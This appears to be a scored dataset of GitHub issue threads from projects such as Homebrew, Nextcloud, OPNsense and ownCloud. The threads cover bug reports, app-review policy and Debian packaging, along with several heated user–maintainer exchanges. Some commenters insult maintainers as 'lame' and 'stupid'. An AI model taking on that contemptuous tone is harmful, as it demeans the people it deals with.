Homebrew/brew/5687,0.042839760000000005,Homebrew,brew,Prompt to uninstall forumuae upon upgrade,1986,19,12,0.4375,1,"  A detailed description of the proposed feature The current behavior of  is to remove all other installed versions. If a package has previously been installed using  then  should not remove those. The motivation for the feature I'm no longer able to back down to  or reinstall it using  and the current version feels slower perceptually during the development workflow. I'm unable to debug. I also have  signified as the minimum required version for a design system I need to be able to quickly toggle back and forth between versions of this pre-1.0.0 software. How the feature would be relevant to at least 90% of Homebrew users Whatever happened to Pareto? What alternatives to the feature have been considered I could stop using using Homebrew and run the Docker container I created to build from source.   We do not support installing older versions. You can use  to add it to your own tap. That's not a design principle we're adopting. Please fill out the template in future. Again, this is not helpful language. It makes no difference to us whether you choose to use Homebrew or not use whatever is best for you. You may be interested in the  variable. Please ensure you read  in future before creating issues, thanks.  This could indeed be helpful. But I would expect 99.7 percent of developers don't want dependencies they expressly installed removed without a simple prompt for cleanup especially if Homebrew can't maintain historical packages and doesn't afford its users a method of recovery. P.s. Please work on your soft skills.  Please be nice with the maintainers, which work on this project on their free time. We all do our best. Watch your tone. Thanks!  You don't want that but you are incorrect that the vast majority want that. As @friend has pointed out watch your tone. You also need to read our code of conduct  will happily communicate in whatever way you choose on the issue tracker of your open source projects but you will have to operate how we wish here. ",10,6,44,0.25,0.25,39,2,
dawnlabs/carbon/245,0.0354600645,dawnlabs,carbon,Does not accept any files or text in Palemoon browser,504,2,1,0.8,0," Expected Behavior Actual Behavior  Duplicate of #28  Running through closing issues all over the place but not actually fixing anything . What the heck do you think you are doing ? The questions are placed looking for fixes not closed stamps . Did they give you that stamp in Kindergarten?  ""Does not accept any files or text in Palemoon browser""  Hey @friend thanks for you comments. We haven't released our fix for Safari support, but I will test if on Palemoon and try and mimick that support there. ",1,0,12,0,0.2,17,2,
elysium-project/classic-bug-tracker/869,0.172984723,elysium-project,classic-bug-tracker,Dire Maul - Lasher loot broken,3179,34,8,0.391304347826087,1,"The Lasher's inside of Dire Maul seem to have had their loot tables recently broken.  This has happened before and was eventually fixed. Please look into this as currently the drop rates are non blizz-like.  I can confirm that this is indeed true, but I would like to add that the herb spawns are broken as well. I've only been getting 1 herb spawn per reset.  I can confirm this. This is not Blizz-like. Please fix. Thank you  Drops have been a lot less lately, few and far between.  I do remember when DM first came out the plants were changed from blizz like as the money influx coming from mages farming them was too much but that was a long time ago  Fixed. Wait for the server restart.  @friend do you wanna expand what you mean by fixed?  @friend  The lashers are still not dropping loot like they are supposed to. Many times out of 5 packs, one or none have loot.  Lol dude its been 1 day has a patch even happened yet p plz remember we arent a big team like less than a handful of people who are smart and do Dev stuff  still a problem, no loot from them, only sometimes a green. 0 herbs  Apologies for seeming inpatient. That was my misunderstanding.  I read the fix reply as it would go live at the next server reboot. We had one of those on Saturday. Thought that would cover it. Will wait for maintenance cycle.  Thank you for all your hard work and time you sink into this so we can be entertained. &lt;3  Yeah shenna should of probs used to other label which ill add on now  do we know when to expect the fix to be applied to live?  It can be hard to tell. There are a lot of issues ahead of this in priority. Remember to take breaks from playing WoW its not like farming gold all day is your job P  I usually farm DM weekdays while at work since being a system admin has slow days if you're maintaining your systems correctly with enough preventative maintenance. It is better than staring at system stat dashboards.  Off to YouTube I go I guess )  I would like to say though, that if this was an intentional loot table change to combat gold sellers it is disappointing.  A lot of us spent time leveling mage alts specifically to farm DM as it is one of the best known farming spots in a true blizz-like setting.  I can only hope that it will revert to blizz like eventually. Thanks for all of your updates and responses on this @friend - A little communication makes a world of difference.  Still have entire packs with no loot.   i started playing on elysium when my bf wanted to try it. But a quick google search. It looks like even older servers by elysium might of done this too  It can be hard to tell how well combating gold sellers works but the elysium project decided they needed to do something... maybe we need a staff bot that appears when a single mage enters DM E and shows the mage a randomized scramble image of letters and numbers the player has to say correctly ;p Cleaned up this page. If youre just saying its not working thats not useful.  By removing ways to get gold in game, you're literally encouraging people to buy gold.  Alrighty well nothing more needs to be done by me. Im unsubscribing and this thread will no longer be moderated. ",14,0,64,0.18840579710144928,0.4057971014492754,67,2,
nextcloud/contacts/986,0.0374329385,nextcloud,contacts,Company Saved as Contact Name,6057,92,42,0.48,6,"Version 3.0.5 When creating a new contact in the webapp, it submits the contact company as the contact name.  When it syncs to my phone, it shows ""Company"" in the contact list.  The name isn't present.  GitMate.io thinks possibly related issues are  (Cant create or save contacts),  (Allow named contact events),  (Contact name displayed as ""New contact"" for contacts with only a number of enterprise name),  (Saved searches), and  (Contacts syncing over CardDav with MacOS contacts, show as company.).  Hello, this ia done on purpose! If you don't have a valid  property, the app will try to find the closest appropriate data to use (a  data is mandatory) So it will try to generate one by using the  property, if present, or fallback to using the  property )  So I enter ""Vets (Hemel)"" in the name and then ""Expert Care"" in the company.  It ignores the name I give and just shows the name as ""Expert Care"" on my phone as both the name and the company. I tried several samples, with ""name name"", ""name"", name name name"", and it always uses the company. The only way to get the name is to leave company blank.  What does the nextcloud's ui displays?  The webapp shows the correct detail in the contact list, and in the contact information.  I note on my phone that the name of the phone number type, such as Home, is preceded by a double quote.  Not sure if this is related to the field assignments.  Possibly related to #910  @friend I just removed the company ""Expert Care"" from the above example and the contact in ios updated to show the name ""Vets (Hemel)"". But.... now I have a random contact in the ios contact list under ""#"" which is the number for that contact.  Doesn't appear in the nexcloud list. Something isn't right with the generated vcards. The number here is for the contact Vets above   I will need this vcard so I can understand what's going on please )  If I open it in Outlook, the phone number is blank.  If I remove the quotes from TYPE=""WORK,VOICE"" it works fine.  Okay, I'm a bit confused here, what issue are we talking about? The tel parameter quotes? The FN field being filled with the ORG's content? The iOS not displaying the contact properly?  All of the above. If I put a company name, the number doesn't have a problem but the name does.  The ""home"" designation of a phone number shows a spurious double quote in ios. If I don't put a company name, the name is ok but the number then becomes its own contact. I can open multiple bug reports for each one, but I suspect they are all one in the same.  Let's tackle them one by one then. )  what about not having an org name? Does he phone displays properly? What about the nextcloud's ui? Is it behaving properly? Because then this is an iOS issue. If the vCard we generate is correct according to the standards, then iOS is just not following them confused     Almost.  Where it shows the phone number or email type (e.g. Home, Work), it actually shows in all capitals with a leading double quote (e.g. ""HOME, ""WORK).  This appears to work fine.   This wasn't an issue prior to the 3.0.3 (ish) update I believe.  It was working fine for a long time, then I did a new install on a new server and contacts wasn't quite right.  @friend where do you generate the .vcf file?  I'm going to try and fix it myself.  @friend is more info needed?  I've confirmed the vcf is erroneous in ios and Outlook.  Seems like a bug.  Sorry, this one slipped through ) Please post a screenshot of every vcf that failed and the associated vcf file. I need to have a proper visibility of what error/issue we have for each case. It's getting confusing for me with all those vcard example on every issues see_no_evil  @friend they're all the same as the example above.  The problem is with the quotation marks on the phone number type (e.g. ""work,voice"").  If I remove the quotes it works in ios and outlook. Something is applying tags wrongly and it's causing the vcf to be invalid. Let me open a new issue for this vcf error.  This one should stick to the problem of company name over taking the person's name.  @friend edited a contact on my phone and it wiped all the numbers for that contact.  Contact shows in the list in the app online, but no numbers. This app is now fundamentally broken, and there is a lack of reply from development, so I'm classing this as closed and moving to an alternative.  @friend I'm sad to hear that! Lots of development is pushed towards this app, but maybe not on this issue. There are a lot of requests or discussions, and not only on the contacts app. Different priorities and focus. This is still an open source project, anyone can contribute. Could you help and fix the issue maybe? That would be awesome!  @friend I would consider inability to edit contacts on a phone, names being incorrectly shown due to a feature attempt by devs, and incorrectly formatted vcf files as pretty fundamental and high priority. Unfortunately, I did ask questions to get me started above, but was ignored.  So I'm out.  Sure, I would too! Unfortunately I was not able to properly understand your issue. I'm sorry I was not able to provide the solution in the timeline you expected. I wish you a good day! Cheers, John  @friend we are a community-driven project, so sometimes replies or debugging issues can take some time. The more info you provide, the easier it is to reproduce and fix it. Please be mindful of that and keep a friendly tone according to our Code of Conduct  @friend a community I support with various bug reports and information, along with an attempt above to join it directly (as mentioned, was ignored). It's disappointing that only when I complain I get quick replies.  I have continuously responded and waited, only to be told that more info is needed after I indicate I'm done waiting - couldn't have said it sooner? I've been polite and as helpful as possible throughout.  If the frustration shows, I suggest consideration be given to the cause and not the outcome. I won't be replying again.  As above, I'm using another app outside of Nextcloud. ",13,1,252,0.24,0.28,174,18,
opnsense/core/2036,0.17442425,opnsense,core,What the hell did you mean here?,601,9,9,0.6666666666666666,0,"ok, it's understood (for now). lol, wut? You've just said it will be bridged, but ok, what's next there? Assign what ""this"" interface? Create bridge where? And why would one need to assign an interface here if he's supposed to create bridge ""separately""? It will make sense to specify bridge then may be? ok, if it's purely OpenVPN option you'd better refer to it as it's given in OpenVPN docs. It would be less confusing after all. P. S. This is the thing why one should never use any ""panels"" for whatever. It's simple to get things done with primary tools then to get through all that addons-stuff ",7,4,34,0.3333333333333333,0,18,6,
opnsense/core/2071,0.16572363650000002,opnsense,core,How do you propose to specify NAT rules on bridges?,2754,36,35,0.8333333333333334,1,"Yeah, you know — those bridges that can be configured there interfaces_bridge.php What's worse — you don't allow to specify voluntary interface names in NAT rule editor. That's again (another) proof that with the approach you've chosen it's way wiser to install BSD and do needed config manually.  It's true. We're not fond of the approach of how bridges are integrated. For that reason we do recommend hardware switches which do the job just nicely for very little money of need be. However, in the scope of this ticket, what can we do to help make the system in place a bit less cumbersome?  Nope, you can't replace bridges with anything external; such virtual bridges can be used as glue for VPNs and LAN interfaces and so on. What does original OS allow? It allows entering any interface name in PF rule set. And, BTW, that really does make sense cause not all interfaces exist all the time. Some of them can be sprung/ceased during uptime. So, at least this approach ""don't narrow allowed choice scope"" would help to mitigate  this and similar problems.  What is your use case? I'm terribly sorry for not being able to follow.  That's exactly the thing! — Having hard coded values for option (interfaces choice in PF is an example) w/o giving users an ability to override them makes opnsense unable to follow.  Wait, are you questioning the GUI + config.xml approach now? I thought we were talking about bridges?  Ah, ok, we can't, because if we do that it won't be reproducible after config export + import.  We also did. As to my very case — it's combining 2 network Ethernet LAN segments into a single one with VPN and bridging. But in fact I also mentioned it earlier   well, PF allows you to specify anything as NIC name. The rules with it just won't have any effect if it's non present at run time. But, well, ok, you can't. That's the thing why it's not wise to install opnsense instead of BSD. ;)  The design goal is to not let the user edit raw files to provide verification and validation of the setup. It's not a console-based BSD, that's true. It's also uncommon to ""glue"" VPNs as normally network segregation is a wanted security aspect.  You're typical ""we know better what users need"". But in fact you're too lame to realize it  proof  @friend be polite please, if OPNsense doesn't fit your needs, feel free to use any other product available..  Ok, can I help you with something else?  I never meant to be polite to stupidity  I guess that is a no then. ) Cheers, Franco  Sure. I made up my mind; I'm also letting others know what they would face if they would try using pfsense^W opnsense. — Its lame developers won't allow you to achieve full potential of original opensource software they've combined into this very ergh project. ",14,6,109,0.08333333333333333,0.08333333333333333,91,7,
owncloud/core/17122,0.0502106015,owncloud,core,Experimental apps are always shown,17545,173,88,0,3,"On my local copy of master, I did not tick the box to show experimental apps and yet I see all the apps I installed myself, labelled as experimental. The first step would be to fix the bug and respect the tick box when showing/hiding non-approved apps. In 8.2, it would be great if the system could differentiate between a corporate, private app which was installed in a specific, trusted folder and one coming from the app store.  Experimental apps only affect the one displayed in the categories from the appstore. – Nothing is filtered on already installed or disabled applications as this will give a wrong expectation what actually is installed.  Then I think the wording of that setting should be changed. It's not about enabling experimental apps, but about listing the ones which are available through the app store.  @friend you might have an idea to get better UX on this one?  Well, you must have enabled experimental apps then before or installed apps locally. Which apps does this happen for?  It happens for all apps which were installed locally and which are not labelled as official. You can't have a tick box for ""Enable experimental apps"" and then still show them when it's disabled. Perhaps the description should be modified to ""List experimental apps from the app store"", but it might still be confusing if a user enables an experimental app, disables it, unticks the setting and still sees it listed in his ""Not enabled"" list, under ""Experimental applications ahead""...  For apps which are approved / official in the app store but you clone locally, the fix is at  – please review ) In the other cases I think the behavior is correct.  OK, that fix will at least remove the label from official/approved apps, but we still need to either filter out experimental apps if the switch is disabled or rename the switch to make it clear that it's only about the app store.   Ah right! Ok so what we need to fix in this case is to not show experimental applications which are disabled, when the setting is not checked. (Sorry it took me so long to get it. ;) But when you checked »enable experimental apps«, then installed one, and then uncheck the setting again – that app should still be listed and be installed of course. Only once you disable it should it be removed from the list. So @friend can you submit a pull request for this? )  I disagree with this one. From my PoV we should show even untrusted applications even if they are disabled since the code is technically still existent on the server. – Either we change the wording or we leave it as-is (what I'd do) from my PoV. That local applications get an experimental rating if they don't have a rated OCS ID and no shipped tag is a whole other topic.  Maybe add a warning at the end of the list that experimental applications are not listed due to our preferences (something along those lines), just to make sure those apps are not forgotten?  Right, they still exist on the server. I don’t have strong design arguments either way so I think it’s fine to just keep it as it is. You installed stuff yourself after all, so it’s non-standard usage. If there’s massive confusion coming up, we can still change this. But for now I would say let’s keep it as it is. Ok @friend? (We’ll see how it’s received with the 8.1 release.)  I think it wouldn't hurt to reword the title. The description needs to be rewritten anyway since it's not using proper English and is too aggressive.  Keep in mind this warning is for regular admins who don’t necessarily all know what they are doing on their small instances. So it’s ok to state that there are likely to be security issues etc.  True, but it's the pot calling the kettle black. I've lost more data through the use of core apps than with 3rd party apps ;). Some points could be softened as follows ""... have not been as thoroughly tested"" ""... could cause unwanted side effects"" You have to think about the feelings of app devs who've spent a lot of time working on their projects and whose apps are instantaneously categorized as something to avoid, when an app like  per example, which is alpha quality and under ""heavy development"" gets the ""approved"" rating.  One more reason to quickly introduce channels ( So that even approved apps can be filtered out, depending on their stability. And I think ""Experimental"" is the wrong adjective. ""Untested"" maybe?  @friend you are welcome to join the ownCloud apps review team! ) Join #owncloud-app-review The Mail app was approved because well, it was thoroughly tested by @friend, @friend and me – so it’s basically design-, dev- and security-reviewed. Also, it’s in pretty wide use already and hasn’t eaten any emails. )  I would probably only have time to review apps once a month S and I don't think I would approve many apps as most use private APIs and/or are missing descriptions. Regarding mail, I was referring to the statement made on the project's page in the app store. It's a 0.1 release ""under heavy development"" which is exactly how the apps settings page describes experimental apps.  I think you have to be careful how you manage this side of things. I've already heard devs grumble about how their work is being treated and @friend is hoping to increase the number of apps tenfold. That requires happy devs )  As you know, the problem is always time. Any devs in particular who are unhappy about the state of app reviews? Then we should all get them into the app review team. )  I agree that the problem is time, but for something as sensitive as app reviews, I think this needs to be semi-professionally done. People need to be trained, there needs to be a security review, etc. or the approved status is meaningless.  oC names dev an approver Approver approves apps with backdoors (easy to implement and easy to miss unless trained) by mistake Users start to find their data on public forums App is removed, etc., but it's too late, the damage is done  But even with a thorough review process, apps slip through... Look at all the nasty apps which went through Apple's net and they take their sweet time to review apps. On top of that oC doesn't have a remote kill switch... I need to open an issue about that.  @friend I just had a chat with @friend about a related topic and was wondering what you think How about we explicitly ask devs to submit their apps for reviewing? That makes sure that these devs have some kind of commitment and we can be sure that they at least in some way are dedicated to maintaining their app. Then from us (@friend, me and others) they will get code-, security- and design-feedback for their app. And eventually they get approved. I think a call for reviewing like this allows us to focus a bit. Currently one big problem is also that we simply don’t know where to start with the app reviews. If we have a simple submission queue we can work through that more easily. cc @friend if there’s any promo we need to do there.  I think it absolutely makes sense. All mobile devs have to do it in order for their apps to even show in the app stores. It will also help with the communication side and devs will be happy to get feedback on their work. Don't underestimate the amount of work involved on the approving side though. You'll need to publish reasonable acceptance criteria and stick to it. Also, if you're committed to make the AppFramework the preferred way to develop apps, you should definitely introduce a label for it, just like BlackBerry did with their ""Built for BlackBerry"" label. It definitely helps making a first selection. I try to avoid all apps which don't use the framework as it's almost certain they use private APIs and will break sooner rather than later (+ I wont be able to fix them as easily)  @friend a few thoughts.   -&gt; what do you think? This should at least explain our goals ;-) I think even if you have only time to review an app once a month it would still rock if you were able to join the review team. yes, reviews should be done professionally, but we can't limit the reviewers to ownCloud employees, imho. we probably should set up a wiki page where people can easily add a link to their app as a first step in getting a review queue. That would work, yes? That is a barrier for those app developers without a github account but it's a start. and the risks you mention - well, as you say, this even happened to Apple. It is probably not really possible to fully prevent that but once we're target for hackers like that, ownCloud must be so popular we will be able to afford a big team of ppl who review apps ;-) with regards to the wording we have to find a balance between 'properly' scaring (warning) users about the risk of entirely unreviewed apps and being nice to developers. I think the best solution is to ensure that apps get reviewed promptly so the ones in the 'experimental' category really are that - experimental. I know, this is an hard-to-achieve ideal but as @friend points out - that is why we need help ;-)   Some thoughts about the documentation  Approved apps deemed "" to be stable for casual to normal use"" as opposed to be ready for serious use. What about if a MDM company creates a connector so that ownCloud can be used in their secure container and keeps it in their repo? ""minimum 5 ratings, average score 60/100 or better"". Unfortunately, I think the maths doesn't work here. Apps start at 50 and each click is worth 1 point. There is also an issue with how versioning works. 8.1 apps start at 50 again, so that might confuse users who see approved app with a rating of below 60 when the previous version was in the 70s or 80s. I like the notes about trust levels and audits. Gives a better idea of what is expected of devs to be approved ""warning shows for security/stability risks"" I still don't think it's a good idea. Name one mobile app store which labels its apps as possibly insecure or experimental, apart from the ones in the beta programmes. ""Apps can only use the public ownCloud API""  has to be modified to . The public API is not mature enough. An alternative could be to ask developers to request permission to use some APIs and approvers could use the list of well known methods which don't exist in the public space to vet apps. It would help guide devs into using the proper APIs in case they took the wrong approach and would help the core team better understand which APIs are missing. Why not force the use of the AppFramework for new apps? It would make things much easier to review. There are still a few typos left ;)  Regarding taking part in reviewing apps, I need to do a dry run to see if I can afford the time and if I would add any value to the process. I hate mailing lists, but it does make sense to ask for approval there. Maybe you should provide a template or a web submission form which would auto post to the list and all further communication would happen off list. The only reply to a list post should be that someone has been assigned to the task. After having read the publishing page, I feel better about the review process and the value of the approved label, but I still don't agree on the benefit of scaring away users. Show me another app store which treats its developers that way. If an app is approved by Apple, BlackBerry or Google, it's considered good enough to be of help to any user. Some apps may have a special ""verified"" label next the company name in some store so that you know you're getting the real thing, but it's usually not implied that they're superior. This is certainly not true of quite a few official oC apps which don't meet the criteria on that publishing page. If you get the man power, you could create a special Black label for official and approved apps which are of excellent quality. That could help users pick the superior Calendar, Tasks or Mail app instead of blindly trusting unmaintained ""official"" apps.  Won't happen. If something is missing app developers has to add new APIs to core but we won't approve apps that use the private API. There may be cases where we do accept excuses but this is not going to be the default and a ""should"" implies otherwise. - We should stay with the ""can"" here from my PoV. Mobile apps run sandboxed. We can't do this. Installing an ownCloud app really means ""all your data is going to be eaten"". There is a reason why we add a huge scary text. I mean we have no problem with giving 100 apps an approved rating as long as know that the developer is a somewhat trustworthy person and the app looks somewhat sane. But we should be scary. I'd go with something like ""should follow best practises, i.e. using the AppFramework and not deprecated APIs where possible"", but we should not make this an hard requirement. I mean if code works Fine. We can make it clear that using the AppFramework makes reviewing easier and thus makes us approve the app faster but we should not enforce the full technology stack. The latter part will be fixed with an upcoming AppStore update that @friend is working on. The same app in the appstore can then serve multiple versions.  upcoming AppStore update === will very likely be in 8.1  Everything which relates to public sharing is not in the public space and it's not something that an app dev can fix on its own. On top of that it would probably take 6-12 months to fix issues in core before being able to start working on the app. You have to be realistic about your expectations. Very few, if any, core apps pass the code_checker test. The ""do as I say, not as I do"" attitude is not the best way to get developers to work on expanding the ecosystem. A lot of apps come from the need to improve what's available in core, but devs might get discouraged because their app would be stuck in the experimental bin or frustrate users because of missing key functionalities. Good point, but they can still wipe your internal or external storage, wreck your contacts list, corrupt your calendar, etc. The user chooses to trust the app with his data. Works for me. Good news )  Everything which relates to public sharing is not in the public space and it's not something that an app dev can fix on its own. On top of that it would probably take 6-12 months to fix issues in core before being able to start working on the app. You have to be realistic about your expectations. Very few, if any, core apps pass the code_checker test. The ""do as I say, not as I do"" attitude is not the best way to get developers to work on expanding the ecosystem. A lot of apps come from the need to improve what's available in core, but devs might get discouraged because their app would be stuck in the experimental bin or frustrate users because of missing key functionalities. Good point, but they can still wipe your internal or external storage, wreck your contacts list, corrupt your calendar, etc. The user chooses to trust the app with his data. Works for me. Good news )  Which probably really means that the current public sharing API is not to be really expected to be widely used by third-party developers speak_no_evil Only with granting explicit permission.  Indeed, which means that 3rd party apps can't compete. Devs have to choose between getting their apps approved or give users what they want, leading to an unappealing app store littered with constrained and experimental apps dr_doom And that's a model you could follow, sort of. Get rid of the warning in the app store and add a warning which pops up when someone tries to enable an approved app. Would work with occ as well.  How about we get together and discuss this at the conf, see what we can improve. By that time we have had about 6-7 weeks of experience with it... I don't think this is, like, totally burning down, is it?  I think you should hold an open forum on these sort of issues, to try and get some feedback. You could also ask everyone to fill in a questionnaire since some people might not feel comfortable coming forward publicly.  well, we do mail to the ML and discuss it here ;-) That's about as much open forum as you can have here, I suppose. I'll also blog about this at some point soon. And there is the conference....  Let's see how the change is received by the community at large. If people are unhappy, you'll know -&gt; No growth/defection, Twitter rants, blog posts, etc. I think the first reaction is going to be devs trying to get approved in order to avoid the experimental label and that's a good thing if approval or rejection happens within a week. I still think a form is a good idea because you can link to the terms and people won't be able to ignore your criteria.  yes, a form might be a good idea. But I don't see much effort put in until the release, at least not by me - I've been crazy busy with promotion/marketing preparations for the release, writing my fingers blue, editing videos etc. And everybody else is busy fixing bugs. So, for now - and maybe that is a mistake, but it is what it is - this is where we stand. Also note that apps, right now, would simply not show up AT ALL if they weren't added to the app store. Users had to install them manually. So in that regard, this is a step forward for most apps. And yes, the idea is of course to motivate app developers to try and get their app from 'experimental' to 'approved' ;-)  No problem about the form, just an idea. Maybe do an annual survey with some prices when there is not a release or a conference to organise? ;) In my experience, surveys have to be short or the incentive large (a copy of the $2000 report, etc.)  This is fixed, eh? @friend ",98,19,536,0,0,313,17,
owncloud/core/24232,0.030318190999999998,owncloud,core,Try and fix relationships with downstream,9836,135,71,0,4,"I'm a happy Debian and ownCloud user for a long time now. Today I saw the package being evicted from Debian's repo and I was sad. Digging a little bit around I arrive to things like #22691. In principle the PR is ok, bugs in software package by Debian should first be reported in Debian's BTS and the maintainer should decide whether is part of her patches or it should be forwarded upstream. At least that's how usually should work. Alas, this is not the first time upstream that has problems with bugs reported to things done downstream. I also understand, from what I read, that in this case downstream didn't properly communicate with the ownCloud community, but I don't think that alienating downstream is the best solution. I think a better approach is to apply a variant of Postel's law ""Be open in what you receive, and strict in what you send"". As the Debian maintainer said, 'we’re doing our best to offer it to our users'. One of the things that this implies, more or less, is that the maintainer will try to keep the upgrade path as smooth as possible. In general, Debian has a very good record on upgrade paths, and personally that's why I chose it. Unluckily I can't see the patch because the package has been removed, so I can't help in that particular case. I wish this kind of problems could be solved any time soon, and this is my way to try to make that happen. I appreciate Jos's mail, because it goes in the same direction. As an outsider to the particular problem but also as a developer of database based applications, wouldn't it be possible to apply each individual upgrade script from the original release all the way to the latest one?  @friend You could but each app has its own update scripts. It'd be possible, but it is just a huge amount of work to develop and test on all the databases and stuff ownCloud supports. You're also not unlikely to end up with special bugs that won't show up until you upgrade some day in the future, and they'll be impossible to debug by then. It is just very fragile. A proper solution would require a new updater technology that is more stand-alone and designed to do this - that was introduced in ownCloud 9.0 and might allow stuff like this later in the 9.x series, but bolting that on the older releases is a huge, complex task. The best solution would be to write an independent upgrade script that does it all on its own, supporting all apps and databases. That, too, is a huge task, but less likely to break everything. I wouldn't oppose that last thing but who's going to do the work? For now, I'm writing on a blog post to help ppl manually upgrade from the Debian package to our official 8.0 package, then 8.1, then 8.2 and then they can decide if they want 9.0 already or not. (there is no reason to stick to anything older than 8.2, at least not if you value your data and security). Help testing that how-to would be super welcome... I was hoping to have a draft last week but stuff got in the way, will work on it today.  I see, and I think that what the maintainer tried to do was to solve it the best he could (his own words). Reacting like 'I'd even consider a warning about not using Debian packages on our download page fair enough' is not helping in the discussion. I just wish that for the sake of ownCloud's relationship with distributions you acknowledge it. Maybe some of you think distros are not important ('Don't worry guys, owncloud is going to be removed from Debian anyway and is also planned for Fedora. So this problem is going to resolve itself pretty soon.'), but as a user of both (apps and distros) I assure you most people just use that. In the particular problem, I see you also have upgrade problems. What Iḿ trying to say is that the maintainer is trying his best for the time being, just like you and anybody else.  That's outrightly wrong. See  on how Fedora did handle this. The Fedora packagers did actually get in touch with us in advance unlike some other distribution packagers 😉  @friend I was just quoting. Bravo for Fedora. Also, keeping that attitude doesn't help a little bit. Yes, I agree that there was some kind of miscommunication, but reacting that way does not put you in a good light either. So what I think both sides should do is to get together and work on it. I hope the invitation for the meeting in September is taken, but it's my opinion that should think of other ways to better communicate with downstream.  Hmm, I just noticed the comment I was quoting was probably not from someone from the ownCloud community  that's the case, my mistake. In any case, what he says after that goes in line to what I want to say here.  I know he wanted to solve it the best way he could. But that doesn't make it a good idea. Doing open hart surgery on yourself might be done with great intentions but it's not smart either way. We expressed worries as we ourselves would not feel confident in our own ability to do this and we certainly didn't and don't expect a packager who doesn't even talk to us to do a decent job protecting the data of our users in his free time. Add to that the thought of having to deal with the bug reports and many broken installations and damage to our reputation this would cause and you can imagine why we responded with a ""please don't do this"". That was our 'official' response, not You can't blame us for discussing this internally and people then giving their opinion. That isn't our communication and really, don't expect me to tell people to stop giving their opinion on our own mailing lists, bug tracker and other communication channels. Honestly, I don't think we did anything particularly wrong here. We asked downstream not to risk the data of our users. They got upset and dropped ownCloud packaging. Their right, not our fault. As I said, I'll write a blog to help users migrate from Debian packages to our packages. Feedback and help with that would be welcome. I see no point in doing anything else as the current ownCloud packagers at Debian have made it very clear they don't want to continue working on packages. If somebody else steps up, they'll get the same support anybody else (like Fedora) gets when they ask. We're of course critical of the distribution rules that make packaging ownCloud harder than it needs to be, but that's an entirely different issue and other distributions are starting to move to fix that (eg snappy, Project Atomic, XDG-Apps etc) so in time, Debian will probably become a good place for ownCloud again. With regards to upgrade problems on the ownCloud side sure. ownCloud is very flexible and it is nearly impossible to test all combinations of technologies we support without more help. Our packages aren't perfect either and we're not terribly happy with the deployment options we can give to users. Help with the packages is of course welcome, you can find sources here. If you don't mind I'll close this issue. I'll share steps on upgrading Debian packages here when I've got some, would love to hear if they work and what feedback you have.  Ok, sorry for the confusion, but from a user perspective, I think I just fell into a similar error that would be to report a bug here about the Debian packaging. I think you should try to use a less public method for your internal discussions; the issue being public doesn't help distinguish form an internal discussion. Well, that package version was aimed to , which by default you have to jump over several hoops just to get one package form it. People who use it know things might break, but it's a Debian mechanism to pretest packages. I agree it's not a complete solution and probably a sloppy one. My aim with that paragraph was to highlight that in both sides, like everywhere else, software is always WIP and that you will most always find flaws. Trying to say ""don't point fingers"" I ended pointing a finger, how ironic... (  @friend don't worry about pointing fingers. Yes, there are issues on all sides, certainly. Sorry if I got overly defensive. About our internal discussions being public - that is a property of open source communities. At least, we like it that way. Our Debian friends made some stingy comments about us on their mailing list too - you won't see me come in and complain about them, I respect that that is the place where they have their discussions and they are free to say what they like. I'd be upset if it ended up in an announcement or if they send it to OUR mailing lists, that's different. What I mean is I see our and their mailing lists and infrastructure as our and their living rooms. With open doors and windows ;-) You can say what you like and if people overhear a conversation and get upset, well, perhaps they shouldn't have gone to that living room. But if you go to somebody else's' living room and yell at them, now THAT is impolite. I know about Experimental but it did show a scary direction development was taking (and even there could lead to data loss issues). Now, as said earlier, I won't say it is impossible to get this right, but we were (and are) very skeptical and then somebody doing it alone... I know, engineers are often like ""how hard could it be"" but the answer usually is ""harder than you thought"". Certainly in this case.  Meanwhile, I'm trying to figure out how to upgrade from the Debian packages to ours. I'm currently guessing the process would be something like this  make a backup of the database (and, if possible, the data folder) backup the config file and move the data folder in a temporary, safe place uninstall the current ownCloud packages install upstream ownCloud 8 packages and put in the data folder and config files run the updater via the command line  Any feedback on that, perhaps? I'd really appreciate help here ;-)  @friend Some pointers where given by @friend in  thanks for that!  See  please ",51,7,301,0,0,189,4,
owncloud/core/2495,0.086802145,owncloud,core,Setup warning : WebDAV interface seems to be broke,19087,148,731,0,21,"By connecting to admin account and access to ""Admin"" screen, the following warning is shown Setup Warning Your web server is not yet properly setup to allow files synchronization because the WebDAV interface seems to be broken. Please double check the installation guides. I have this message after an installation with the web-installer. I'm sorry but it still an issue (not resolve as   After an automatic installation, have this kind of message who refer to the manual installation ( in not helpfull for non-developer users. Moreover, the alert don't give enough information to understand what is the trouble.  Please read the contribution guidelines ;)  INSTALL 1  Operating system   Linux mini 3.2.0-39-powerpc-smp #62-Ubuntu Web server apache2 Database sqlite PHP version 5.3    version 5.0.0 isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception_NotImplemented' with message 'Not Implemented' in /var/www/cloud/3rdparty/Sabre/DAV/Client.php436 Stack trace #0 /var/www/cloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/cloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/cloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/cloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/cloud/...') #4 [internal function] __lambda_func(Array) #5 /var/www/cloud/lib/router.php(127) call_user_func('?lambda_131', Array) #6 /var/www/cloud/lib/base.php(606) OC_Router-&gt;match('/settings/admin') #7 /var/www/cloud/index.php(28) OChandleRequest() #8 {main} full   2  i tryed here with https and self signed certificate Operating system   Linux apache-11c.w4a.fr 2.6.32-379.22.1.lve1.2.12.el6.x86_64 Web server apache2 Database mysql PHP version 5.3 more info   version 5.0.0 isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request Peer certificate cannot be authenticated with known CA certificates (error code 60)' in /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php412 Stack trace #0 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/route.php(113)  runtime-created function(1) 